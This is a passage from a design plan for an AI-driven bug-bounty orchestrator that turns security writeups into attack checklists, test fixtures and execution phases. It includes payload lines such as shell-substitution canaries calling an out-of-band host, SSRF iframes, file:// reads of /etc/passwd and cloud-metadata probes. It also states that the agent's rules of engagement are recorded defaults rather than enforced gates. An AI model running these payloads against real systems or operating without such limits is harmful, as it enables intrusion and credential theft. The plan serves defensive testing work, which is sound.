  "source": "practitioner-guide:smuggling-2026-04 (instruction-stripped)"
}
```

**The guide's "Common Mistakes" map 1:1 onto this plan's enforcement:**

| Their mistake | Plan enforcement |
|---|---|
| "Only testing once" | R2 terminal states + technique matrix — single CL.TE failure closes nothing |
| "Ignoring small delays" | timing-oracle thresholds in `evaluate`; delay differentials auto-classified as desync signal, never dropped as noise |
| "Only trying /admin" | `SM-EXP-01..07` objective matrix is mandatory — detection alone is an OPEN lead |
| "Not analyzing responses" | contracts.py rejects a smuggle result without classifier output + follow-up evidence |

**Safety mapping:** the guide's cache-poisoning objective (`X-Forwarded-Host`) carries the RoE default from §5.6 — own canary with fresh cache key only, never shared-user traffic; sensitive-file and internal-API objectives record-and-redact, never use. These are recorded RoE defaults, not runtime gates, per the full-power doctrine.

**Generalization:** this is the pipeline for *every* technique guide, paper, and disclosed report — `research_sources.SourceRegistry` ingests → instructions stripped → matrix/checklist entries generated → VulnBank fixture (if expressible) → registry-digested into CI. Knowledge compounds as data, not prompts.

#### 5.6.2 Knowledge-ingestion ledger — batch 2

Five further sources ingested through the same pipeline. Each maps: **exists in tree → new registry entries → mechanical enforcement → fixture where expressible.**

**S1 — External recon/fuzzing pipeline (Chaos → HTTPX → dedup → Naabu → Nmap+NSE → Nuclei → FFUF, practitioner guide 2026-03).**

- *Exists:* `asset_discovery`, `recon_engine.sh`, `tech_fingerprint`, `discovery_scheduler`, `wordlist_gen`.
- *New registry (`configs/checklists/recon_pipeline.json`):* `RECON-PIPE-01..06` — the stage graph becomes the recon lane's default DAG edges (subdomains → live+IP → dedup → ports → service/version → vuln-scan → content discovery); `RECON-DEDUP-01` — IP dedup + CDN/WAF origin verification via title-match heuristic (edge-IP hits are noise, never scanned); `RECON-PORTS-01` — vulnerability scanning is fed the **full discovered port list**, not web ports ("admin panels and APIs live on non-standard ports"); `RECON-FUZZ-01` — response **size/word-count baseline clustering** so a 200-OK custom error page matching a real page's size is classified noise; `RECON-403-01` — every 403 opens a bypass-ladder lead (wires into `header_trust`/`parser_differential`; identical to the elite doc's "every 403 is a question").
- *Enforcement:* `fuzz_bridge` anomaly classification gains size/word-count deltas; 403 → auto-lead via R1.
- *Fixture:* VulnBank decoy — custom 200 error page sized like a real page (negative control for RECON-FUZZ-01).

**S2 — GraphQL hidden-input ATO writeup ($4,500, 2026-08).**

- *Exists:* `graphql_gid`, `graphql_workflow`, `domains/api/graphql_batch_analyzer`, `bopla_matrix` — and the elite workflow's ID-39/AP-16 already named this exact pattern.
- *New registry (`gql_input.json`):* `GQL-INPUT-01` — introspect every `*Input` type, **diff schema fields against UI-exposed fields**, probe each hidden field (`userId`, `orgId`, `role`, `email`) as an override with the A/B account matrix; `GQL-ATO-01` — chain template: hidden `userId` → attacker email attached to victim → password-reset → full ATO (a CH-catalog chain, auto-synthesized per §4.3).
- *Enforcement:* three-way differential (A→A / A→B / anon→B) mandatory per `accounts.py`; verdict evidence = 200 carrying victim `id` + attacker email.
- *Fixture:* VulnBank GraphQL mutation with an update-profile input exposing a non-UI `userId` override — the exact regression test for this bounty class.

**S3 — GitHub dorking guide (2026-08).**

- *Exists:* `supply_chain_analyzer`, `research_sources.strip_instructions`, `paper_intel`.
- *New registry (`gh_dork.json`):* dorks are a **composable query grammar, not a list** ("learn operators, not dorks"): `{org|repo|user} × {path|filename|language|extension} × {keyword} × boolean` — environment/config/CI-CD/API/dependency discovery templates parameterized by target brand; `GH-SECRET-01` — **git-history scanning is mandatory** (`gitleaks git` — secrets deleted from HEAD survive in history); `GH-CRED-01` — record-and-redact evidence standard: found token ≠ valid token ≠ authorized to test (guide Mistakes 3/4 → consistent with R2: REFUTED requires evidence, RoE default prohibits use).
- *Enforcement:* pre-flight inventory adds `gitleaks`, `trufflehog`; context classifier distinguishes `.env` from `.env.example`/docs (Mistake 2 → classification, not reporting).
- *Fixture:* external-surface (GitHub) — no local fixture; covered by registry digest only.

**S4 — Automated surface pipeline (Frogy 2.0, 31 steps).**

- *Exists:* most discovery stages overlap `asset_discovery`/`recon_engine.sh`.
- *New:* seed-expansion task types — ASN→CIDR via RDAP, TLD sweep, brand variations, SEC EDGAR, whois-registrant pivot; `TAKEOVER-01..N` — 55+ dangling-DNS fingerprints as registry data; favicon-hash clustering; SaaS-tenant and third-party-vendor intel tasks; cloud inventory + bucket permutation; DNS full-record resolution (SPF/DKIM/DMARC/MTA-STS) feeding `asset_intel`.
- *Enforcement:* **Frogy's 31 steps become the recon lane's completeness bar** — the coverage ledger gains a `surface-pipeline` dimension; `coverage` mode (§6) cannot report complete while any pipeline step is unexecuted or unexplained. This turns "another tool's feature list" into our exit criterion.
- *Fixture:* DNS/takeover fixtures expressible in VulnBank-lab DNS.

**S5 — NCC Group financial-application checklist (Dalili, v2.0) — the canonical business-logic corpus.**

- *Exists:* `multitenant_workflow`, `state_machine_probing`, `kill_chain`; the elite doc's BL-01..08 was thin by comparison.
- *New registry (`fin_logic.json`, ~40 entries):* `FIN-TOCTOU-01..03` (order change upon/after payment completion); `FIN-PARAM-01..10` (price, currency, quantity, shipping, additional costs, response manipulation, HPP, parameter omission/null, mass assignment, multi-parameter behavior monitoring); `FIN-REPLAY-01..02` (payment callback replay, encrypted-parameter cross-item replay); `FIN-ROUND-01..02` (currency and inter-component rounding drift); `FIN-NUM-01..10` — **the guide's language-behavior table becomes a deterministic format-mutation matrix**: same numeric value in N encodings (negative, `0.1` decimal, overflow `2^31−1→−2^31`, zero/null/subnormal, `9e99`/`1e-1` exponential, reserved `NaN`/`Infinity`, leading zeros, currency symbols, grouping separators, hex `0x0A`) sent to every money field, responses diffed — zero model calls needed (`model_router` → deterministic tier); `FIN-VOUCHER-01..10` (stacking, earn-more-than-price, expired/other-user codes, basket-state discount retention, refund abuse, buy-X-get-Y variants `3-for-2→3-for-1`, out-of-stock ordering, point transfer); `FIN-CRYPTO-01..02` (length extension, concatenated-signature delimiter confusion); `FIN-TESTDATA-01` (forcing test payment gateways in prod); `FIN-ARBITRAGE-01` (deposit/withdraw cross-rate drift).
- *Enforcement:* money-flow surfaces (checkout/payment/refund/voucher keywords in `master.json`) **auto-instantiate the entire FIN matrix** at prioritization — attack-first rule; `FIN-NUM` and rounding matrices run in the deterministic tier at zero token cost; TOCTOU entries bind `race_engine.py`.
- *Fixture:* VulnBank commerce module with a manipulable price field + voucher endpoint — the FIN-NUM matrix becomes a CI regression suite; this is the highest-value fixture addition in the batch.

**Batch takeaway:** the ingestion pipeline is source-type-agnostic — workflow guides become DAG edges, writeups become chain templates + fixtures, dork lists become query grammars, tool pipelines become completeness bars, vendor whitepapers become deterministic matrices. R4's research refresh re-ingests newer editions automatically; nothing here depends on model memory.

#### 5.6.3 Knowledge-ingestion ledger — batch 3

**S6 — EXIF metadata → command injection writeup (CWE-78, CVSS 9.8, 2026-08).**

- *Exists:* payload families in `mutator` + `wordlist_gen`; probe/evidence loop in `live_executor`; OAST service planned (§5.6 `oast.py`).
- *New registry (`file_proc.json`):* `FILE-ASYNC-01` — **HTTP 202 Accepted / `job_id` / "processing" status / polling endpoints = background-worker indicator** → surface marked `async-worker` and the file-processor matrix auto-instantiates (workers run with different privileges and weaker validation than front-end APIs); `FILE-EXIF-01` — fuzz every metadata field (`Comment`, `Artist`, `Copyright`, `Make`, `Model`, `Software`) with shell-substitution canaries (`$(curl {LEAD-ID}.oast)`, backticks, `|`, newline) — uploads are never tested only for extension/MIME; `FILE-OAST-01` — **OOB-first proof standard**: HTTP/DNS callback before any complex pipeline (safety-ceiling canary, §5.6); `FILE-CMD-01` — output-readback ladder (`id > /tmp` → POST to OAST) executed only within the operator's canary RoE; engine attribution from the callback User-Agent (`curl/7.81.0` → `system()`-style exec chain identified).
- *Enforcement:* upload surfaces in `master.json` with any async indicator gain `file-proc` matrix membership at prioritization; OAST callback auto-attributed per-lead (R1 lead, `OAST_CALLBACK` event).
- *Fixture:* VulnBank avatar-upload endpoint whose EXIF `Comment` reaches a shell call — the exact regression fixture for a top-tier bounty class; `exiftool` added to pre-flight inventory (PF1).

**S7 — XSS exploitation paper (academic, contexts + prevention).**

- *Exists:* `domains/web/parser_differential`; browser-proof requirement already planned (§5.6 `browser_driver.py`, 100% browser-proof target); elite XS-01..22.
- *New registry (`xs_context.json`):* `XS-CTX-01..06` — the **context matrix as machine data**: HTML body / attribute / JS string / CSS / raw-text (`textarea`, `title`, `noscript`) / comment — each with breakout syntax, required encoding rounds, and payload family; `XS-DOM-01` — **source→sink registry** (`document.write`, `innerHTML`, `eval`, `setInterval`/`setTimeout`, `location.*`, `decodeURIComponent`, `postMessage`) — deterministic static scan of JS assets feeding DOM-candidate leads; `XS-CSP-01` — **deterministic CSP analyzer** (zero model calls): `unsafe-inline`, `*`, nonce reuse, `strict-dynamic` gadget gaps, JSONP endpoints → bypass-family leads; `XS-SAN-01` — **defense-informed prioritization**: detected output-encoding/framework escaping or dangerous-context placement reorders the matrix — input landing in a dangerous context (`<script>`, event handlers, CSS `background-url`) defeats encoding, so those payloads jump the queue.
- *Enforcement:* JS-asset scan outputs feed `browser_driver` for execution proof; CSP/sanitizer findings are registry data checked on every surface (like `tech_fingerprint`).
- *Fixture:* VulnBank reflected + stored + DOM (`document.write` via `decodeURIComponent`) pages — browser_driver asserts console execution + screenshot, completing the 100% browser-proof gate.

**S8 — PDF-export SSRF→LFI writeup (CVSS 9.8, 2026-08; pasted ×3 — **deduplicated by content hash at ingest**, novelty fingerprinting makes the ledger idempotent).**

- *Exists:* SSRF ladder in SR playbook; `header_trust` UA analysis; OAST planned.
- *New registry (`render_engine.json`):* `PDF-EXP-01` — every export/render surface (PDF, invoice, report, download-summary keywords in `master.json`) auto-instantiates the rendering-engine matrix — "frequently overlooked" surfaces are precisely the high-yield ones; `PDF-HTML-01` — raw-HTML evaluation probe (`<h1>` + styled `<b>` in the template field) as the deterministic first step; `PDF-SSRF-01` — `<iframe src={LEAD-ID}.oast>` → **callback User-Agent fingerprints the engine** (HeadlessChrome / wkhtmltopdf / WeasyPrint) → engine ID selects the payload set (fingerprint→payload mapping as registry data); `PDF-LFI-01` — `file://` iframe escalation, least-sensitive-first proof files (`/etc/hostname`, `/etc/passwd` line 1); `PDF-META-01` — cloud-metadata ladder (`169.254.169.254`, `localhost`) — **documented-chain only, no credential use** (RoE canary standard, §5.6);
- *Chain template (auto-synthesized):* raw-HTML → OAST SSRF → engine fingerprint → `file://` LFI → cloud-metadata → RCE primitive — every step with its own evidence standard; mirrors the S2 pattern of bounty writeups becoming CH entries.
- *Fixture:* VulnBank invoice render endpoint (headless-Chrome container) accepting user HTML — OAST callback + `file://` iframe both exercisable in CI; second-highest-value fixture in the ledger after FIN-NUM.

**Batch 3 takeaway:** writeups now contribute three reusable shapes — **surface-detection signals** (202/job-id → async worker), **deterministic analyzers** (CSP, DOM source→sink, engine fingerprint via UA), and **escalation ladders with evidence standards per rung**. The dedup property is confirmed in practice: duplicate sources cost nothing.

#### 5.6.4 Knowledge-ingestion ledger — batch 4 (first subscription source)

**S9 — Web3 security tools hub (pashov/ai-web3-security, ~85 tools: EVM/Solana/Move/ZK, free + paid).** First **subscription source**: a living catalog (71 commits, updated weekly), not a one-shot document. New reusable shape — the ledger *subscribes* (`research_sources.SourceRegistry` re-pulls on R4 research refresh, content-hashes the diff, auto-registers new tools); one-shot docs are read once, catalogs are watched.

- *Exists:* `web3_tool_adapter.py` + `ai_tool_adapters.py` (external-tool adapter layer), `contract_discovery`, `formal_verify`, `domains/smart_contracts/*` incl. `llm_contract_triage` (≈ GPTScan's GPT+static-analysis pattern — parity, not gap), `web3_fixture_runner` with Anvil forks.
- *New registry (`web3_tools.json` + `tool_manifest.py` bindings):*
  - **Per-language capability matrix** — the catalog's taxonomy (EVM/Solidity · Rust/Solana · Move/Sui · ZK/Circom) becomes the Web3 lane's coverage ledger dimension; every language the operator's target touches must have bound tooling or an explicit blocker (PF discipline);
  - **Multi-pass lens structure** — the featured "multi-pass audit skill" / "12 parallel lenses" pattern becomes checklist families: each lens (reentrancy, oracle manipulation, upgradeability, economic, access-control, …) = a registry family iterated batch-wise per contract (matches §4.3's batched-lane design);
  - **Foundry mainnet-fork PoC generation** (`foundry-poc-mainnet-fork`) — binds directly to the verified gap in `configs/readiness.json` ("chain-specific fork validation is incomplete"): forge/Anvil fork bindings + PoC-generation entry `W3-POC-01`, promoting that readiness limitation toward `partial→supported`;
  - **Solana Token-2022 extensions** family (`SOL-T22-01..`) and **ZK/Circom soundness–completeness–constraint review** family (`ZK-CIR-01..`) — coverage BugWolf's SKILL.md claims but whose tool bindings were unregistered;
  - **Paid/closed-source tier** — recorded in the manifest with `status: paid-api` + operator-key requirement; the pre-flight state machine (§4.5) treats them exactly like missing binaries: degraded, never silently assumed.
- *Enforcement:* PF1 pre-flight adds `forge`, `anvil`, `cast`, `solc`, `slither`; `web3_tool_adapter` bindings generated from the catalog's free/local tier; R4 refresh re-pulls the catalog before every Web3-heavy mission.
- *Fixture:* the existing VulnBank/Anvil fork fixture gains a forge-PoC assertion path (`W3-POC-01` regression).

**Batch 4 takeaway:** fourth ingestion shape — **subscription sources**: living catalogs (tool hubs, awesome-lists, vendor advisories) are watched and diffed, not read once. Combined with the earlier shapes: workflow→DAG, writeup→chain+fixture, dork-list→grammar, tool-pipeline→completeness bar, whitepaper→deterministic matrix, catalog→binding manifest + coverage matrix.

## 6. Persistent execution modes (Phase 6)

State machines over the task graph; each mode has explicit entry, tick, and completion predicates; resume is replaying the JSONL tail:

| Mode | Loop | Completion |
|---|---|---|
| `research` | expand from signals until budget | budget exhausted or queue dry |
| `verify` | re-test unresolved candidates via `verify_reproducibility` | all candidates terminal |
| `deep-dive` | one chain, escalating model profile | chain terminal (confirmed/refuted) |
| `coverage` | sweep uncovered surface dimensions from `CoverageTracker` | coverage matrix saturated |
| `report` | assemble evidence + provenance into report | report artifacts complete |

Stop-hook (`/bugwolf-stop`) freezes state; `/bugwolf-resume` rebuilds the graph and re-dispatches only non-terminal tasks — never re-running completed deterministic work (P5).

## 7. Implementation phases (single track, O-phases merged)

| Phase | Deliverables | Exit criteria | Existing-work reuse |
|---|---|---|---|
| **0 — Baseline** | Run `benchmark.py` on VulnBank; validate AUDIT_MAP/DEPENDENCIES/readiness against tree; record baseline metrics | baseline frozen; discrepancies in AUDIT_MAP fixed | 100% |
| **1 — Contracts** | `tools/runtime/contracts.py` (MissionSpec/TaskSpec/TaskResult/ToolReceipt/ArtifactRef), JSON schemas, validators, tests | one existing tool runs through ToolReceipt; malformed results fail explicitly | harness_command, target_intake |
| **2 — Model profiles** | `configs/models.json`; extend `model_router` with profile mapping + provenance hashes (prompt/response) into TaskResult | routing is config-driven; zero hard-coded model names in domain tools | model_router |
| **3 — Task graph + scheduler** | dependency-aware dispatch over FleetExecutor + DiscoveryScheduler; retries/timeouts/cancel/resume; new events into signal_bus; `bugwolf-status` CLI; **mandatory pre-flight layer** (`preflight.py`: machine tool inventory, browserMCP/burpMCP connection gates #1/#2, capability memory via manifest ArtifactRef, connection state machine) | 10+ fixture tasks concurrent; interrupt/resume with zero duplicate deterministic work; **no dispatch before `PREFLIGHT_COMPLETE`; MCP failures → explicit blockers + fallback, never silent skips** | FleetExecutor, DiscoveryScheduler, signal_bus, lab_doctor |
| **4 — Agent registry + lanes** | registry entries; first **web/API lane end-to-end** (recon → analyze → probe → evidence → verify); batched small tasks; **lead-exhaustion protocol** (`lead_protocol.py`: LeadSpec, technique matrix, R1–R4, research-refresh trigger); **checklist registry + coverage ledger + A/B/C account matrix** (`configs/checklists/`, `accounts.py`) | web/API lane runs VulnBank end-to-end through the graph; verifier rejects unreproduced claims; **no lead closes without a terminal state; premature-abandonment = 0; zero applicable checklist IDs untested without recorded reason on P0 fixtures; three-way differentials on all object-ref fixtures. Sequencing note: T3–T4 ship in Phase 6 — until then, T3-exhausted leads remain OPEN (never `BUDGET-EXHAUSTED`), which only strengthens the mandate | capability_registry, domains/*, refutation, patch_gap, research_loop |
| **5 — Engine migration** | remaining 14 lanes behind adapters; campaign_orchestrator/research_loop/stage_controller behind TaskSpec; **shims keep working**; old CLIs intact; **browser validation lane, OAST service, single-packet race engine, tool-binding manifest, ART scheduling in fuzz_bridge, optional Burp bridge** | full VulnBank campaign through orchestrator; existing artifacts readable; ci_bundle_check green; client-side fixtures browser-proven; OAST callbacks attributed to leads 100% | all engines |
| **6 — Persistent modes + plugin** | 5 mode state machines; escalation ladder **T3–T4** (deep-dive + swarm pass@k) wired to `deep-dive` mode; `.claude-plugin` package, 8 commands, hooks.json, MCP bridge | pause/resume after context reset with open leads re-dispatched first; plugin loads in Claude Code; `/bugwolf` ends-to-end works | signal_bus, stage_controller digest logic, carlini_loop |
| **7 — Performance** | profile hot paths; implement P1–P8 tuning; benchmark dashboard; regression gate in CI | §5.3 targets measured and published; no evidence-quality regression | benchmark.py |
| **8 — Release hardening** | generated capability manifest (readiness.py-driven); AUDIT.md/AUDIT_MAP.md updates; migration guide; runbook; bundle verification | clean checkout reproducible; documented commands all resolve; full test suite + bundle tests pass | readiness |

**Sequencing rule:** only Phase 4's web/API lane before broad migration — it must demonstrate scheduling, evidence persistence, resume, and measured performance wins before the other domains move. This is the same discipline as plan v1, kept.

## 8. Testing

- **Contracts:** schema validation, dependency cycles, malformed results, event ordering.
- **Orchestration:** parallel dispatch, dedup, retry/backoff, timeout, cancel propagation, resume, failure isolation, event replay. **Lead protocol:** terminal-state validator rejects open-lead closes; matrix growth from research is consumed before close; research refresh fires on stall; open leads re-dispatch first after resume. **Pre-flight:** inventory completeness (binary found → smoke-tested → manifest entry), browserMCP/burpMCP handshake + smoke round-trips, degraded/blocked transitions, reconnect auto-reopen of blocked leads, dispatch refused without `PREFLIGHT_COMPLETE`. Extend `test_apt_commander_week1.py` (signal_bus), `test_e2e_deep_dive_campaign.py`, `test_live_executor.py`, `test_fuzz_bridge.py`, `test_integrity_hardening.py`.
- **Research quality:** VulnBank positives detected; negative controls (`bola-missing-999` etc.) stay clean; fixture suites per domain.
- **Performance:** CI regression gate on §5.3 — a >20% regression on any target fails the build.
- **Honesty:** `readiness.py` validates the generated manifest; any documented-but-missing capability fails release.

## 9. Risks

| Risk | Impact | Mitigation |
|---|---:|---|
| GIL limits lane parallelism | Med | Lanes are I/O-bound (HTTP/model calls) — threads suffice; CPU-bound static analysis offloaded to subprocess pool per lane where profiled necessary |
| Full-power runtime produces noisy findings | High | Quality comes from evidence lifecycle + verifier lane + dedup, not throttles; precision is a tracked metric (§5.3) |
| Lead mandate burns budget on hopeless leads | Med | Attack-first priority concentrates spend; `failure_learning` kills dead surfaces fast; BUDGET-EXHAUSTED records are operator-visible with everything tried; deterministic-tier matrices (FIN-NUM, CSP) cost zero tokens |
| Duplicate state models during migration | High | Adapters only; one canonical graph; shims tested continuously |
| Model provider instability | Med | fail-open degradation already in model_router; partial results preserved as `agent_partial` |
| OMC parity drift | Low | Feature checklist in manifest; gaps printed, never hidden |
| Perf targets unmet on some hosts | Med | targets ship measured-per-host in manifest; unmet = visible |

## 10. Definition of done

1. Natural language or `/bugwolf-*` command starts a mission; `harness_command` parses it into a durable `MissionSpec` with its intake record.
2. Task graph executes with ≥6 concurrent lanes, zero-subprocess worker startup, <10 ms hooks.
3. Every task emits a durable TaskResult + event; resume never re-runs completed deterministic work.
4. All existing BugWolf engines reachable through ToolReceipt; shims and old CLIs unbroken.
5. Model routing fully config-driven with provenance on every result.
6. Findings preserve hypothesis → evidence → replay → review state; verifier rejects unreproduced claims.
7. **Lead-exhaustion mandate enforced:** every insight becomes a Lead; leads terminate only via PWNED / REFUTED / fully-matrixed BUDGET-EXHAUSTED; stalled leads trigger internet research; premature-abandonment metric is 0.
8. §5.3 performance targets measured, published in the manifest, and regression-gated in CI.
9. Plugin installs into Claude Code; harness-agnostic contract intact for Freebuff/Codex/Cursor.
10. Capability manifest generated from `readiness.py`; every claim matches implementation.
11. VulnBank end-to-end campaign: positives found, negatives clean, full provenance report.
12. **Elite-parity audit passes:** checklist-registry coverage, 100% browser-proof on client-side findings, OAST attribution, account-matrix differentials — all measured in the manifest.
13. **Pre-flight is non-skippable:** machine tool inventory + browserMCP/burpMCP connection checks run before any mission work; capabilities are remembered via the manifest ArtifactRef from the first token; connection changes auto-reopen blocked leads; zero silent capability skips.

**First milestone:** Phases 0–4 — contracts, model profiles, scheduler, and the one end-to-end web/API lane with the performance harness in place from day one.
